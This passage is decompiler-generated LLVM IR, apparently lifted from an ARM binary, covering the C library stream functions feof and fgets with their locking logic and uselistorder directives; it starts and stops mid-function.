  uselistorder i32 %v0_c930, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_c918, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_c908, { 1, 0 }
  uselistorder i32 %v3_c900, { 0, 2, 1 }
  uselistorder i8 %v2_c900, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c980, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_c8c4, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_c8b0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_c898, { 1, 0 }
  uselistorder i32 %v3_c8a4.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_c84c, { 0, 2, 1 }
  uselistorder i32 %v2_c838, { 1, 0, 2 }
  uselistorder i32 %v0_c7ec, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 2, 1, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20 }
  uselistorder i32* %r6.global-to-local, { 10, 12, 9, 14, 13, 3, 4, 11, 5, 15, 6, 7, 8, 16, 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 536, { 1, 2, 0 }
  uselistorder i32 -38004, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_cd1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cd18, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_cce4, { 1, 0 }
  uselistorder label %dec_label_pc_ccb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cca8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_cc64, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_cc1c, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca30, { 1, 0 }
  uselistorder label %dec_label_pc_c9e4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_c960, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c95c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_c8fc, { 1, 0 }
  uselistorder label %dec_label_pc_c8f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c8fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c89c, { 1, 0 }
  uselistorder label %dec_label_pc_c870, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_cd58 = load i32, i32* @r4, align 4
  store i32 %v3_cd58, i32* %stack_var_-24, align 4
  %v2_cd5c = add i32 %tmp, 52
  %v3_cd5c = inttoptr i32 %v2_cd5c to i32*
  %v4_cd5c = load i32, i32* %v3_cd5c, align 4
  store i32 %v4_cd5c, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cd60 = icmp eq i32 %v4_cd5c, 0
  store i32 %tmp, i32* %r7.global-to-local, align 4
  br i1 %v2_cd60, label %dec_label_pc_cd6c, label %dec_label_pc_cdd0

dec_label_pc_cd6c:                                ; preds = %entry
  %v0_cd6c = call i32 @__aeabi_read_tp()
  %v0_cd70 = load i32, i32* %r7.global-to-local, align 4
  %v1_cd70 = add i32 %v0_cd70, 64
  %v2_cd70 = inttoptr i32 %v1_cd70 to i32*
  %v3_cd70 = load i32, i32* %v2_cd70, align 4
  store i32 %v3_cd70, i32* %r3.global-to-local, align 4
  %v1_cd74 = add i32 %v0_cd6c, -1168
  store i32 %v1_cd74, i32* %r8.global-to-local, align 4
  %v3_cd78 = icmp uge i32 %v3_cd70, %v1_cd74
  store i1 %v3_cd78, i1* %cpsr_c.global-to-local, align 1
  %v9_cd78 = icmp eq i32 %v3_cd70, %v1_cd74
  br i1 %v9_cd78, label %dec_label_pc_cdc4, label %dec_label_pc_cd80

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd6c
  %v1_cd80 = add i32 %v0_cd70, 56
  store i32 %v1_cd80, i32* %r5.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_cd80, i32* %r2.global-to-local, align 4
  %v0_cd8c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_cd8c, i32* %r4.global-to-local, align 4
  %v1_cd9035 = inttoptr i32 %v1_cd80 to i32*
  %v2_cd9036 = load i32, i32* %v1_cd9035, align 4
  store i32 %v2_cd9036, i32* %r3.global-to-local, align 4
  %v3_cd9438 = icmp uge i32 %v2_cd9036, %v0_cd8c
  store i1 %v3_cd9438, i1* %cpsr_c.global-to-local, align 1
  %v9_cd9444 = icmp eq i32 %v2_cd9036, %v0_cd8c
  br i1 %v9_cd9444, label %dec_label_pc_cd9c, label %dec_label_pc_cdb4

dec_label_pc_cd9c:                                ; preds = %dec_label_pc_cd80, %dec_label_pc_cd9c.dec_label_pc_cd90_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cdac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cdac, label %dec_label_pc_cdb0, label %dec_label_pc_cd9c.dec_label_pc_cd90_crit_edge

dec_label_pc_cd9c.dec_label_pc_cd90_crit_edge:    ; preds = %dec_label_pc_cd9c
  %v0_cd90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cd94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cd90 = inttoptr i32 %v0_cd90.pre to i32*
  %v2_cd90 = load i32, i32* %v1_cd90, align 4
  store i32 %v2_cd90, i32* %r3.global-to-local, align 4
  %v3_cd94 = icmp uge i32 %v2_cd90, %v1_cd94.pre
  store i1 %v3_cd94, i1* %cpsr_c.global-to-local, align 1
  %v9_cd94 = icmp eq i32 %v2_cd90, %v1_cd94.pre
  br i1 %v9_cd94, label %dec_label_pc_cd9c, label %dec_label_pc_cdb4

dec_label_pc_cdb0:                                ; preds = %dec_label_pc_cd9c
  %v0_cdb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cdb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cdb4

dec_label_pc_cdb4:                                ; preds = %dec_label_pc_cd80, %dec_label_pc_cd9c.dec_label_pc_cd90_crit_edge, %dec_label_pc_cdb0
  %v0_cdb4 = phi i32 [ %v0_cdb0, %dec_label_pc_cdb0 ], [ %v2_cd9036, %dec_label_pc_cd80 ], [ %v2_cd90, %dec_label_pc_cd9c.dec_label_pc_cd90_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cdb4 = icmp eq i32 %v0_cdb4, 0
  br i1 %v2_cdb4, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_cdb4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_cdb4, %bb
  %v1_cdbc = xor i1 %v2_cdb4, true
  call void @__pseudo_cond_branch(i1 %v1_cdbc, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_cdc0 = load i32, i32* %r8.global-to-local, align 4
  %v1_cdc0 = load i32, i32* %r7.global-to-local, align 4
  %v2_cdc0 = add i32 %v1_cdc0, 64
  %v3_cdc0 = inttoptr i32 %v2_cdc0 to i32*
  store i32 %v0_cdc0, i32* %v3_cdc0, align 4
  %v0_cdc4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cdc4

dec_label_pc_cdc4:                                ; preds = %dec_label_pc_cd6c, %bb19
  %v0_cdc4 = phi i32 [ %v0_cd70, %dec_label_pc_cd6c ], [ %v0_cdc4.pre, %bb19 ]
  %v1_cdc4 = add i32 %v0_cdc4, 60
  %v2_cdc4 = inttoptr i32 %v1_cdc4 to i32*
  %v3_cdc4 = load i32, i32* %v2_cdc4, align 4
  %v1_cdc8 = add i32 %v3_cdc4, 1
  store i32 %v1_cdc8, i32* %r3.global-to-local, align 4
  store i32 %v1_cdc8, i32* %v2_cdc4, align 4
  %v0_cdd0.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_cdd4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cdd0

dec_label_pc_cdd0:                                ; preds = %entry, %dec_label_pc_cdc4
  %v1_cde8 = phi i32 [ %tmp, %entry ], [ %v0_cdd4.pre, %dec_label_pc_cdc4 ]
  %v0_cdd0 = phi i32 [ %v4_cd5c, %entry ], [ %v0_cdd0.pre, %dec_label_pc_cdc4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cdd0 = icmp eq i32 %v0_cdd0, 0
  %v1_cdd4 = inttoptr i32 %v1_cde8 to i16*
  %v2_cdd4 = load i16, i16* %v1_cdd4, align 2
  %v3_cdd4 = zext i16 %v2_cdd4 to i32
  store i32 %v3_cdd4, i32* %r6.global-to-local, align 4
  br i1 %v2_cdd0, label %dec_label_pc_cddc, label %dec_label_pc_ce50

dec_label_pc_cddc:                                ; preds = %dec_label_pc_cdd0
  %v1_cddc = add i32 %v1_cde8, 60
  %v2_cddc = inttoptr i32 %v1_cddc to i32*
  %v3_cddc = load i32, i32* %v2_cddc, align 4
  %v1_cde0 = add i32 %v3_cddc, -1
  store i32 %v1_cde0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cde4 = icmp eq i32 %v1_cde0, 0
  store i32 %v1_cde0, i32* %v2_cddc, align 4
  br i1 %v2_cde4, label %dec_label_pc_cdf0, label %dec_label_pc_ce50

dec_label_pc_cdf0:                                ; preds = %dec_label_pc_cddc
  %v0_cdf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_cdf0 = load i32, i32* %r7.global-to-local, align 4
  %v2_cdf0 = add i32 %v1_cdf0, 64
  %v3_cdf0 = inttoptr i32 %v2_cdf0 to i32*
  store i32 %v0_cdf0, i32* %v3_cdf0, align 4
  %v0_cdf4 = load i32, i32* %r7.global-to-local, align 4
  %v1_cdf4 = add i32 %v0_cdf4, 56
  store i32 %v1_cdf4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cdf8

dec_label_pc_cdf8:                                ; preds = %dec_label_pc_ce28.dec_label_pc_cdf8_crit_edge, %dec_label_pc_cdf0
  %v0_ce00 = phi i32 [ %v0_ce00.pre, %dec_label_pc_ce28.dec_label_pc_cdf8_crit_edge ], [ %v1_cdf4, %dec_label_pc_cdf0 ]
  %v0_cdf8 = phi i32 [ %v0_cdf8.pre, %dec_label_pc_ce28.dec_label_pc_cdf8_crit_edge ], [ %v0_cdf4, %dec_label_pc_cdf0 ]
  %v1_cdf8 = add i32 %v0_cdf8, 56
  %v2_cdf8 = inttoptr i32 %v1_cdf8 to i32*
  %v3_cdf8 = load i32, i32* %v2_cdf8, align 4
  store i32 %v3_cdf8, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_ce00, i32* %r2.global-to-local, align 4
  %v1_ce0423 = inttoptr i32 %v0_ce00 to i32*
  %v2_ce0424 = load i32, i32* %v1_ce0423, align 4
  store i32 %v2_ce0424, i32* %r3.global-to-local, align 4
  %v3_ce0826 = icmp uge i32 %v2_ce0424, %v3_cdf8
  store i1 %v3_ce0826, i1* %cpsr_c.global-to-local, align 1
  %v9_ce0832 = icmp eq i32 %v2_ce0424, %v3_cdf8
  br i1 %v9_ce0832, label %dec_label_pc_ce10, label %dec_label_pc_ce28

dec_label_pc_ce10:                                ; preds = %dec_label_pc_cdf8, %dec_label_pc_ce10.dec_label_pc_ce04_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ce20 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ce20, label %dec_label_pc_ce24, label %dec_label_pc_ce10.dec_label_pc_ce04_crit_edge

dec_label_pc_ce10.dec_label_pc_ce04_crit_edge:    ; preds = %dec_label_pc_ce10
  %v0_ce04.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ce08.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ce04 = inttoptr i32 %v0_ce04.pre to i32*
  %v2_ce04 = load i32, i32* %v1_ce04, align 4
  store i32 %v2_ce04, i32* %r3.global-to-local, align 4
  %v3_ce08 = icmp uge i32 %v2_ce04, %v1_ce08.pre
  store i1 %v3_ce08, i1* %cpsr_c.global-to-local, align 1
  %v9_ce08 = icmp eq i32 %v2_ce04, %v1_ce08.pre
  br i1 %v9_ce08, label %dec_label_pc_ce10, label %dec_label_pc_ce28

dec_label_pc_ce24:                                ; preds = %dec_label_pc_ce10
  %v0_ce24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ce24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ce28

dec_label_pc_ce28:                                ; preds = %dec_label_pc_cdf8, %dec_label_pc_ce10.dec_label_pc_ce04_crit_edge, %dec_label_pc_ce24
  %v0_ce30 = phi i32 [ %v0_ce24, %dec_label_pc_ce24 ], [ %v2_ce0424, %dec_label_pc_cdf8 ], [ %v2_ce04, %dec_label_pc_ce10.dec_label_pc_ce04_crit_edge ]
  %v1_ce28 = phi i32 [ %v0_ce24, %dec_label_pc_ce24 ], [ %v3_cdf8, %dec_label_pc_cdf8 ], [ %v1_ce08.pre, %dec_label_pc_ce10.dec_label_pc_ce04_crit_edge ]
  %v3_ce28 = icmp uge i32 %v0_ce30, %v1_ce28
  store i1 %v3_ce28, i1* %cpsr_c.global-to-local, align 1
  %v9_ce28 = icmp eq i32 %v0_ce30, %v1_ce28
  br i1 %v9_ce28, label %dec_label_pc_ce30, label %dec_label_pc_ce28.dec_label_pc_cdf8_crit_edge

dec_label_pc_ce28.dec_label_pc_cdf8_crit_edge:    ; preds = %dec_label_pc_ce28
  %v0_cdf8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_ce00.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cdf8

dec_label_pc_ce30:                                ; preds = %dec_label_pc_ce28
  %v2_ce30 = icmp ne i32 %v1_ce28, 0
  store i1 %v2_ce30, i1* %cpsr_c.global-to-local, align 1
  %v7_ce34 = icmp slt i32 %v1_ce28, 2
  br i1 %v7_ce34, label %dec_label_pc_ce50, label %dec_label_pc_ce38

dec_label_pc_ce38:                                ; preds = %dec_label_pc_ce30
  %v0_ce3c = load i32, i32* @r1, align 4
  %v1_ce3c = add i32 %v0_ce3c, 129
  store i32 %v1_ce3c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ce50

dec_label_pc_ce50:                                ; preds = %dec_label_pc_cddc, %dec_label_pc_cdd0, %dec_label_pc_ce38, %dec_label_pc_ce30
  %v0_ce50 = load i32, i32* %r6.global-to-local, align 4
  %v1_ce50 = and i32 %v0_ce50, 4
  %v2_ce54 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_ce54, i32* @r4, align 4
  ret i32 %v1_ce50

; uselistorder directives
  uselistorder i32 %v0_ce24, { 1, 0, 2 }
  uselistorder i32 %v1_ce08.pre, { 0, 2, 1 }
  uselistorder i32 %v1_cd94.pre, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 4, 1, 7, 5, 6, 8 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 12, 5, 6, 7, 8, 10, 9, 0, 11 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 11, 12, 9, 10 }
  uselistorder label %dec_label_pc_ce50, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_ce28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ce10, { 1, 0 }
  uselistorder label %dec_label_pc_cdd0, { 1, 0 }
  uselistorder label %dec_label_pc_cdc4, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_cdb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cd9c, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ce5c = load i32, i32* @r4, align 4
  store i32 %v3_ce5c, i32* %stack_var_-32, align 4
  %v6_ce5c = load i32, i32* @r5, align 4
  %v9_ce5c = load i32, i32* @r6, align 4
  %v12_ce5c = load i32, i32* @r7, align 4
  %v15_ce5c = load i32, i32* @r8, align 4
  %v24_ce5c = load i32, i32* @lr, align 4
  %v1_ce60 = add i32 %arg3, 52
  %v2_ce60 = inttoptr i32 %v1_ce60 to i32*
  %v3_ce60 = load i32, i32* %v2_ce60, align 4
  store i32 %v3_ce60, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ce64 = icmp eq i32 %v3_ce60, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_ce64, label %dec_label_pc_ce78, label %dec_label_pc_cedc

dec_label_pc_ce78:                                ; preds = %entry
  %v0_ce78 = call i32 @__aeabi_read_tp()
  %v1_ce7c = add i32 %arg3, 64
  %v2_ce7c = inttoptr i32 %v1_ce7c to i32*
  %v3_ce7c = load i32, i32* %v2_ce7c, align 4
  store i32 %v3_ce7c, i32* %r3.global-to-local, align 4
  %v1_ce80 = add i32 %v0_ce78, -1168
  store i32 %v1_ce80, i32* @r8, align 4
  %v3_ce84 = icmp uge i32 %v3_ce7c, %v1_ce80
  store i1 %v3_ce84, i1* %cpsr_c.global-to-local, align 1
  %v9_ce84 = icmp eq i32 %v3_ce7c, %v1_ce80
  br i1 %v9_ce84, label %dec_label_pc_ced0, label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_ce78
  %v1_ce8c = add i32 %arg3, 56
  store i32 %v1_ce8c, i32* @r5, align 4
  store i32 %v1_ce8c, i32* %r2.global-to-local, align 4
  %v0_ce98 = load i32, i32* @r6, align 4
  store i32 %v0_ce98, i32* @r4, align 4
  %v1_ce9c36 = inttoptr i32 %v1_ce8c to i32*
  %v2_ce9c37 = load i32, i32* %v1_ce9c36, align 4
  store i32 %v2_ce9c37, i32* %r3.global-to-local, align 4
  %v3_cea039 = icmp uge i32 %v2_ce9c37, %v0_ce98
  store i1 %v3_cea039, i1* %cpsr_c.global-to-local, align 1
  %v9_cea045 = icmp eq i32 %v2_ce9c37, %v0_ce98
  br i1 %v9_cea045, label %dec_label_pc_cea8, label %dec_label_pc_cec0

dec_label_pc_cea8:                                ; preds = %dec_label_pc_ce8c, %dec_label_pc_cea8.dec_label_pc_ce9c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ceb8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ceb8, label %dec_label_pc_cebc, label %dec_label_pc_cea8.dec_label_pc_ce9c_crit_edge

dec_label_pc_cea8.dec_label_pc_ce9c_crit_edge:    ; preds = %dec_label_pc_cea8
  %v0_ce9c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cea0.pre = load i32, i32* @r4, align 4
  %v1_ce9c = inttoptr i32 %v0_ce9c.pre to i32*
  %v2_ce9c = load i32, i32* %v1_ce9c, align 4
  store i32 %v2_ce9c, i32* %r3.global-to-local, align 4
  %v3_cea0 = icmp uge i32 %v2_ce9c, %v1_cea0.pre
  store i1 %v3_cea0, i1* %cpsr_c.global-to-local, align 1
  %v9_cea0 = icmp eq i32 %v2_ce9c, %v1_cea0.pre
  br i1 %v9_cea0, label %dec_label_pc_cea8, label %dec_label_pc_cec0

dec_label_pc_cebc:                                ; preds = %dec_label_pc_cea8
  %v0_cebc = load i32, i32* @r4, align 4
  store i32 %v0_cebc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cec0

dec_label_pc_cec0:                                ; preds = %dec_label_pc_ce8c, %dec_label_pc_cea8.dec_label_pc_ce9c_crit_edge, %dec_label_pc_cebc
  %v0_cec0 = phi i32 [ %v0_cebc, %dec_label_pc_cebc ], [ %v2_ce9c37, %dec_label_pc_ce8c ], [ %v2_ce9c, %dec_label_pc_cea8.dec_label_pc_ce9c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cec0 = icmp eq i32 %v0_cec0, 0
  br i1 %v2_cec0, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_cec0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_cec0, %bb
  store i32 52940, i32* @lr, align 4
  %v1_cec8 = xor i1 %v2_cec0, true
  call void @__pseudo_cond_branch(i1 %v1_cec8, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_cecc = load i32, i32* @r8, align 4
  %v1_cecc = load i32, i32* @r7, align 4
  %v2_cecc = add i32 %v1_cecc, 64
  %v3_cecc = inttoptr i32 %v2_cecc to i32*
  store i32 %v0_cecc, i32* %v3_cecc, align 4
  br label %dec_label_pc_ced0

dec_label_pc_ced0:                                ; preds = %dec_label_pc_ce78, %bb20
  %v0_ced0 = load i32, i32* @r7, align 4
  %v1_ced0 = add i32 %v0_ced0, 60
  %v2_ced0 = inttoptr i32 %v1_ced0 to i32*
  %v3_ced0 = load i32, i32* %v2_ced0, align 4
  %v1_ced4 = add i32 %v3_ced0, 1
  store i32 %v1_ced4, i32* %r3.global-to-local, align 4
  store i32 %v1_ced4, i32* %v2_ced0, align 4
  %v0_cedc.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_cee0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_cee4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cedc

dec_label_pc_cedc:                                ; preds = %entry, %dec_label_pc_ced0
  %v0_cee4 = phi i32 [ %arg3, %entry ], [ %v0_cee4.pre, %dec_label_pc_ced0 ]
  %v0_cee0 = phi i32 [ %arg2, %entry ], [ %v0_cee0.pre, %dec_label_pc_ced0 ]
  %v0_cedc = phi i32 [ %arg1, %entry ], [ %v0_cedc.pre, %dec_label_pc_ced0 ]
  store i32 %v0_cee4, i32* %r2.global-to-local, align 4
  %v3_cee8 = inttoptr i32 %v0_cedc to i8*
  %v4_cee8 = call i32 @__GI_fgets_unlocked(i8* %v3_cee8, i32 %v0_cee0, i32 %v0_cee4)
  %v0_ceec = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ceec = icmp eq i32 %v0_ceec, 0
  store i32 %v4_cee8, i32* %r8.global-to-local, align 4
  br i1 %v2_ceec, label %dec_label_pc_cef8, label %dec_label_pc_cf6c

dec_label_pc_cef8:                                ; preds = %dec_label_pc_cedc
  %v0_cef8 = load i32, i32* @r7, align 4
  %v1_cef8 = add i32 %v0_cef8, 60
  %v2_cef8 = inttoptr i32 %v1_cef8 to i32*
  %v3_cef8 = load i32, i32* %v2_cef8, align 4
  %v1_cefc = add i32 %v3_cef8, -1
  store i32 %v1_cefc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cf00 = icmp eq i32 %v1_cefc, 0
  store i32 %v1_cefc, i32* %v2_cef8, align 4
  br i1 %v2_cf00, label %dec_label_pc_cf0c, label %dec_label_pc_cf6c

dec_label_pc_cf0c:                                ; preds = %dec_label_pc_cef8
  %v0_cf0c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf0c = load i32, i32* @r7, align 4
  %v2_cf0c = add i32 %v1_cf0c, 64
  %v3_cf0c = inttoptr i32 %v2_cf0c to i32*
  store i32 %v0_cf0c, i32* %v3_cf0c, align 4
  %v0_cf10 = load i32, i32* @r7, align 4
  %v1_cf10 = add i32 %v0_cf10, 56
  store i32 %v1_cf10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cf14

dec_label_pc_cf14:                                ; preds = %dec_label_pc_cf44.dec_label_pc_cf14_crit_edge, %dec_label_pc_cf0c
  %v0_cf1c = phi i32 [ %v0_cf1c.pre, %dec_label_pc_cf44.dec_label_pc_cf14_crit_edge ], [ %v1_cf10, %dec_label_pc_cf0c ]
  %v0_cf14 = phi i32 [ %v0_cf14.pre, %dec_label_pc_cf44.dec_label_pc_cf14_crit_edge ], [ %v0_cf10, %dec_label_pc_cf0c ]
  %v1_cf14 = add i32 %v0_cf14, 56
  %v2_cf14 = inttoptr i32 %v1_cf14 to i32*
  %v3_cf14 = load i32, i32* %v2_cf14, align 4
  store i32 %v3_cf14, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_cf1c, i32* %r2.global-to-local, align 4
  %v1_cf2024 = inttoptr i32 %v0_cf1c to i32*
  %v2_cf2025 = load i32, i32* %v1_cf2024, align 4
  store i32 %v2_cf2025, i32* %r3.global-to-local, align 4
  %v3_cf2427 = icmp uge i32 %v2_cf2025, %v3_cf14
  store i1 %v3_cf2427, i1* %cpsr_c.global-to-local, align 1
  %v9_cf2433 = icmp eq i32 %v2_cf2025, %v3_cf14
  br i1 %v9_cf2433, label %dec_label_pc_cf2c, label %dec_label_pc_cf44

dec_label_pc_cf2c:                                ; preds = %dec_label_pc_cf14, %dec_label_pc_cf2c.dec_label_pc_cf20_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cf3c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cf3c, label %dec_label_pc_cf40, label %dec_label_pc_cf2c.dec_label_pc_cf20_crit_edge

dec_label_pc_cf2c.dec_label_pc_cf20_crit_edge:    ; preds = %dec_label_pc_cf2c
  %v0_cf20.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cf24.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cf20 = inttoptr i32 %v0_cf20.pre to i32*
  %v2_cf20 = load i32, i32* %v1_cf20, align 4
  store i32 %v2_cf20, i32* %r3.global-to-local, align 4
  %v3_cf24 = icmp uge i32 %v2_cf20, %v1_cf24.pre
  store i1 %v3_cf24, i1* %cpsr_c.global-to-local, align 1
  %v9_cf24 = icmp eq i32 %v2_cf20, %v1_cf24.pre
  br i1 %v9_cf24, label %dec_label_pc_cf2c, label %dec_label_pc_cf44

dec_label_pc_cf40:                                ; preds = %dec_label_pc_cf2c
  %v0_cf40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cf40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cf44

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf14, %dec_label_pc_cf2c.dec_label_pc_cf20_crit_edge, %dec_label_pc_cf40
  %v0_cf4c = phi i32 [ %v0_cf40, %dec_label_pc_cf40 ], [ %v2_cf2025, %dec_label_pc_cf14 ], [ %v2_cf20, %dec_label_pc_cf2c.dec_label_pc_cf20_crit_edge ]
  %v1_cf44 = phi i32 [ %v0_cf40, %dec_label_pc_cf40 ], [ %v3_cf14, %dec_label_pc_cf14 ], [ %v1_cf24.pre, %dec_label_pc_cf2c.dec_label_pc_cf20_crit_edge ]
